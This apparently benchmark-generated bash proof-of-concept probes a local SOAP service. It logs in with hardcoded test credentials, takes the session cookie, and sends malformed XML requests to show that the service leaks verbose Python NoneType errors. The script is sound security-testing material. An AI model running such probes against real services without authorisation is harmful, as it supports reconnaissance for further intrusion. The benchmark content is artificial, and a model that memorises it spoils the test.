#!/bin/bash
# POC: Demonstrates that the SOAP service returns verbose Python error messages (NoneType attribute errors) when processing malformed XML requests, disclosing implementation details
# Target: ./repo
# Created: 2025-10-31T17:07:58.616Z
# Session: benchmark-XBEN-032-24-mhf2utzd

echo "============================================"
echo "POC: Verbose Error Messages in SOAP Service"
echo "============================================"
echo ""
echo "This POC demonstrates that the SOAP service returns detailed Python error"
echo "messages that disclose implementation details when processing malformed requests."
echo ""

TARGET="http://localhost:8080"
SOAP_ENDPOINT="${TARGET}/soap_service"

# First, we need to login to get a valid session cookie
echo "[*] Step 1: Logging in to obtain session cookie..."
LOGIN_RESPONSE=$(curl -s -i -X POST "${TARGET}/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=john&password=password123" 2>&1)

# Extract session cookie
SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "Set-Cookie: session=" | sed 's/.*session=\([^;]*\).*/\1/' | head -n1)

if [ -z "$SESSION_COOKIE" ]; then
  echo "[!] Failed to obtain session cookie. Login may have failed."
  echo "[*] Proceeding without authentication to test error handling..."
  SESSION_COOKIE="invalid"
fi

echo "[+] Session cookie obtained: ${SESSION_COOKIE:0:20}..."
echo ""

# Test 1: Invalid SOAP operation (baseline - should return generic error)
echo "----------------------------------------"
echo "[*] Test 1: Sending invalid SOAP operation"
echo "----------------------------------------"
echo "Request: <InvalidRequest><account_id>123456</account_id></InvalidRequest>"
echo ""

TEST1_RESPONSE=$(curl -s -X POST "$SOAP_ENDPOINT" \
  -H "Cookie: session=$SESSION_COOKIE" \
  -H "Content-Type: application/xml" \
  -d '<InvalidRequest><account_id>123456</account_id></InvalidRequest>')

echo "Response:"
echo "$TEST1_RESPONSE"
echo ""

# Test 2: Missing required field (should expose verbose Python error)
echo "----------------------------------------"
echo "[*] Test 2: Sending GetAccountInfoRequest WITHOUT required account_id field"
echo "----------------------------------------"
echo "Request: <GetAccountInfoRequest><malicious_field>test</malicious_field></GetAccountInfoRequest>"
echo ""

TEST2_RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$SOAP_ENDPOINT" \
  -H "Cookie: session=$SESSION_COOKIE" \
  -H "Content-Type: application/xml" \
  -d '<GetAccountInfoRequest><malicious_field>test</malicious_field></GetAccountInfoRequest>')

HTTP_CODE=$(echo "$TEST2_RESPONSE" | grep "HTTP_CODE:" | cut -d':' -f2)
RESPONSE_BODY=$(echo "$TEST2_RESPONSE" | sed '/HTTP_CODE:/d')

echo "HTTP Status Code: $HTTP_CODE"
echo "Response Body:"
echo "$RESPONSE_BODY"
echo ""

# Test 3: Another variation - GetAccountHolderInfoRequest without account_id
echo "----------------------------------------"
echo "[*] Test 3: Sending GetAccountHolderInfoRequest WITHOUT required account_id field"
echo "----------------------------------------"
echo "Request: <GetAccountHolderInfoRequest><invalid>data</invalid></GetAccountHolderInfoRequest>"
echo ""

TEST3_RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$SOAP_ENDPOINT" \
  -H "Cookie: session=$SESSION_COOKIE" \
  -H "Content-Type: application/xml" \
  -d '<GetAccountHolderInfoRequest><invalid>data</invalid></GetAccountHolderInfoRequest>')

HTTP_CODE3=$(echo "$TEST3_RESPONSE" | grep "HTTP_CODE:" | cut -d':' -f2)
RESPONSE_BODY3=$(echo "$TEST3_RESPONSE" | sed '/HTTP_CODE:/d')

echo "HTTP Status Code: $HTTP_CODE3"
echo "Response Body:"
echo "$RESPONSE_BODY3"
echo ""

# Analysis
echo "============================================"
echo "[*] VULNERABILITY ANALYSIS"
echo "============================================"
echo ""

if echo "$RESPONSE_BODY" | grep -q "NoneType"; then
  echo "[+] VULNERABILITY CONFIRMED: Verbose Python error message detected!"
  echo ""
  echo "    Error message contains: 'NoneType' object has no attribute"
  echo ""
  echo "    Information disclosed:"
  echo "    - Programming language: Python (NoneType is Python-specific)"
  echo "    - Implementation detail: Uses .text attribute on XML elements"
  echo "    - Code flaw: Missing null/None checks before accessing attributes"
  echo ""
  echo "[!] Impact: This information helps attackers understand the application's"
  echo "    internal structure and can be used for more targeted attacks."
  echo ""
  exit 0
elif echo "$RESPONSE_BODY" | grep -q "attribute"; then
  echo "[+] VULNERABILITY CONFIRMED: Verbose error message detected!"
  echo ""
  echo "    The error message reveals internal implementation details."
  echo ""
  exit 0
elif echo "$RESPONSE_BODY3" | grep -q "NoneType"; then
  echo "[+] VULNERABILITY CONFIRMED: Verbose Python error message detected in Test 3!"
  echo ""
  echo "    Error message contains: 'NoneType' object has no attribute"
  echo ""
  exit 0
else
  echo "[-] Could not confirm verbose error messages. Responses may have been sanitized."
  echo ""
  echo "Test 2 Response: $RESPONSE_BODY"
  echo "Test 3 Response: $RESPONSE_BODY3"
  echo ""
  exit 1
fi